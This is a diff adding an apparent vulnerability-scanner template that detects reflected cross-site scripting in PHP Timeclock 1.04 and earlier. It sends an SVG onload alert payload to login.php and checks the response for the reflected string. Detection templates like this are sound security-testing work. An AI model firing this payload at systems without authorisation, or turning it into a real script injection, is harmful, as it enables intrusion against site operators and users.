@@ -1,0 +1,33 @@
+id: php-timeclock-xss
+brief:
+    title: PHP Timeclock <=1.04 - Cross-Site Scripting
+    by: pikpikcu
+    level: high
+    about: PHP Timeclock 1.04 and prior contains multiple cross-site scripting vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php
+    label:
+        - xss
+        - php
+        - timeclock
+        - edb
+        - intrusive
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/login.php/''%3E%3Csvg/onload=alert%60{{randstr}}%60%3E'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <svg/onload=alert`{{randstr}}`>
+            - PHP Timeclock Admin Login
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
